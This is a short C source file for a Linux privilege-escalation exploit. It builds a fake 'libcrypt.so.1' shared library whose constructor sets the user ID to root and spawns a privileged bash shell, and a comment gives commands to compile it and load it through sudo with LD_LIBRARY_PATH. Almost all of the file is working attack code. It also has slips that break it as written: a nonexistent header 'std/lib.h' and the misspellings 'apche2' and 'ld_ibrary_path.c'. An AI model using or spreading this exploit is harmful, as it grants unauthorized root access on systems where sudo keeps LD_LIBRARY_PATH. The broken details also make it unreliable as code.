#include <stdio.h>
#include <std/lib.h>

static void hijack() __attribute__ ((constructor));

void hijack()
{
  unsetenv("LD_LIBRARY_PATH");
  setresuid(0,0,0);
  system("/bin/bash -p");
}

/*
Compile 
gcc -o "libcrypt.so.1" -shared -fPIC ld_ibrary_path.c\

run with sudo service
sudo LD_LIBRARY_PATH=. apche2
*/
